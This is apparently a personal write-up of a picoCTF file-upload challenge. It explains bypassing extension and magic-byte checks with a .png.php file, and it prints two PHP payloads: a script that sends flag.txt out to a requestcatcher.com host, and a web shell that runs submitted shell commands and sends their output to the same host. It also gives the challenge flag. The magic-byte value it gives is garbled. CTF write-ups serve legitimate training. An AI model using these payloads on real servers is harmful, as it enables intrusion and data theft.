# FileUpload and RCE Based CTFs

## PicoCTF: Trickster: File_Upload: RCE :Medium

Got a picoCTF reverse shell challenge caused by malicious file upload. A webpage was given containing a file uplaod form which at the end was founded to contain vulnerabilities. The file extension and the magic bytes were getting checked at the backend. This information was obtained from the /instructions.txt file which we got by accessing /robots.txt file. The robots.txt file also told that there is /upload directory. Any file uploading from the form was getting saved in that directory with the same name which was used while uploading the file. So file which was getting uploaded was easily accessible. 
A php script was written to check whether the command execution was working or not.

```php
<?php
$output=file_get_contents("flag.txt");
file_get_contents("https://falano.requestcatcher.com/$output");
echo "executed";
?>
```
![image](https://github.com/user-attachments/assets/c6aa8a6d-4728-4900-9062-8c3bee080c4c)

It worked so fine. 

So, thought to expand the script to get the reverse shell. But realized that could be difficult to get it as the underlying networking infrastructure is complex(**I'll confirm it later though**). So, wrote a php script that renders html form which on submit sends post request to the same file and the data on post request is executed as shell command and the output is echoed.
```php
PNG
<?php

if (isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd);

    file_get_contents("https://falano.requestcatcher.com/$output");
    echo "executed";
    echo "<br>";
    echo $output;
}

?>

<form action="final2.png.php" method="post">
    <input type="text" name="cmd" />
    <button type="submit">Execute</button>
</form>
```

The filename has to saved with extension of `.png.php` not `.php.png` and the header bytes for pnp images need to be added `89 50 4E r7`

The file got sucessfully uploaded and everthing ahead happened as exected. 
The flag was kept in the parent of /upload dir and was saved with a werid name. Anyways...

**Got the flag***
![image](https://github.com/user-attachments/assets/abda4f33-0c1a-4df5-b6bc-c2c268bd57fe)

**Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}**

